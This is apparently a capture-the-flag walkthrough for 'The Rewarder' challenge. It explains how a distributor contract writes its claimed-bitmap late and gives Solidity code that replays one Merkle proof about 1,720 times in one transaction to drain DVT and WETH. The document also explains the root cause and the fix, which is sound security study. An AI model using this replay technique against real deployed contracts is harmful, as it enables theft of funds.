## Challenge 5 Walkthrough: The Rewarder

### Vulnerability

The vulnerability lies in `TheRewarderDistributor.claimRewards()`'s delayed state update. Reading the actual control flow:

```solidity
for (uint256 i = 0; i < inputClaims.length; i++) {
    inputClaim = inputClaims[i];

    uint256 wordPosition = inputClaim.batchNumber / 256;
    uint256 bitPosition  = inputClaim.batchNumber % 256;

    if (token != inputTokens[inputClaim.tokenIndex]) {
        // Token has changed — write the bitmap for the PREVIOUS token
        if (address(token) != address(0)) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
        token  = inputTokens[inputClaim.tokenIndex];
        bitsSet = 1 << bitPosition;
        amount  = inputClaim.amount;
    } else {
        bitsSet = bitsSet | 1 << bitPosition;
        amount += inputClaim.amount;
    }

    // For the last claim in the array — write the bitmap for the CURRENT token
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }

    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount); // ← transfer happens every iteration
}
```

There are **two** `_setClaimed` call sites, not one:
- **On token switch** — when the claim array transitions from one token to another, the bitmap is written for the token that just finished
- **At array end** — the bitmap is written for whichever token was active last

Critically, `transfer` happens on **every iteration** — but `_setClaimed` fires only twice for the entire array (once per token group). All intermediate claims for the same token accumulate transfers without any bitmap check.

This is why the exploit submits all DVT claims first, then all WETH claims: the DVT bitmap is written at the single token-switch point, the WETH bitmap is written at the end. Each group of hundreds of identical claims triggers exactly one bitmap write, regardless of how many transfers have already gone out.

### Exploit

The player's address `0x44E97aF4418b7a17AABD8090bEA0A471a366305C` is at **index 188** in both distribution files, confirmed in the JSON data:
- DVT claim amount: `11,524,763,827,831,882`
- WETH claim amount: `1,171,088,749,244,340`

These small individual amounts are what make the attack viable — each fits into the total distribution balance hundreds of times.

#### Step 1 — Load Merkle Leaves

```solidity
bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
```

Loads all 1,000 beneficiary entries from both JSON files to reconstruct the Merkle tree, enabling valid proof generation for any index.

#### Step 2 — Calculate Number of Repeated Claims

```solidity
uint256 dvtClaims  = dvt.balanceOf(address(distributor))  / playerDvtAmount;
uint256 wethClaims = weth.balanceOf(address(distributor)) / playerWethAmount;
```

Uses **actual remaining balances** post-Alice's claim rather than the original totals. Both approaches work:

| Method | Value | Behaviour |
|--------|-------|-----------|
| `balanceOf(distributor) / amount` | ~865 DVT + ~852 WETH | Reads real state after Alice — more precise |
| `TOTAL_DISTRIBUTION / amount` | ~867 DVT + ~853 WETH | Slightly overestimates but still drains below threshold |

The goal is reducing the distributor below `1e16` DVT and `1e15` WETH — not draining to exactly zero — so either works. The `balanceOf` approach is more robust since it reflects actual on-chain state regardless of prior claims.

#### Step 3 — Build ~1,720 Identical Claims

```solidity
Claim[] memory claims = new Claim[](totalClaims);
for (uint256 i = 0; i < totalClaims; i++) {
    if (i < dvtClaims) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: playerDvtAmount,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, 188)
        });
    } else {
        claims[i] = Claim({
            batchNumber: 0,
            amount: playerWethAmount,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, 188)
        });
    }
}
```

The array is ordered **all DVT first, then all WETH** — this is not arbitrary. The two-trigger `_setClaimed` pattern means the token ordering directly controls when each bitmap write fires. Interleaving DVT and WETH claims would trigger `_setClaimed` on every token switch, immediately blocking the replay. Grouping them ensures each token's bitmap is written exactly once, after all its transfers have gone through.

#### Step 4 — Submit All Claims in One Transaction

```solidity
distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
```

The distributor processes all ~865 DVT transfers (bitmap written once at the switch), then all ~852 WETH transfers (bitmap written once at the end). Total: ~1,720 transfers, 2 bitmap writes.

#### Step 5 — Transfer to Recovery

```solidity
dvt.transfer(recovery, dvt.balanceOf(player));
weth.transfer(recovery, weth.balanceOf(player));
```

### Why It Works

The root cause is treating claim validation as a batch-level concern rather than a per-claim concern. The contract accumulates amounts and bits across all claims of the same token, deferring the bitmap write until the token changes or the array ends. This means a single valid proof can be submitted hundreds of times before the bitmap ever gets checked.

A correct implementation would call `_setClaimed()` before each individual transfer — checking and writing the bitmap atomically per claim. The current design inverts this: transfer first, mark claimed last.

The exploit's DVT-then-WETH ordering is essential, not cosmetic. It ensures the two bitmap writes happen exactly where the attacker expects — maximising drain within each token group before the write fires.

This is an **intra-transaction replay attack via delayed state write** — the attacker never leaves the transaction, so the bitmap is never read as "claimed" during any of the ~1,720 iterations. One valid proof per token, hundreds of payouts per token, two bitmap writes total.
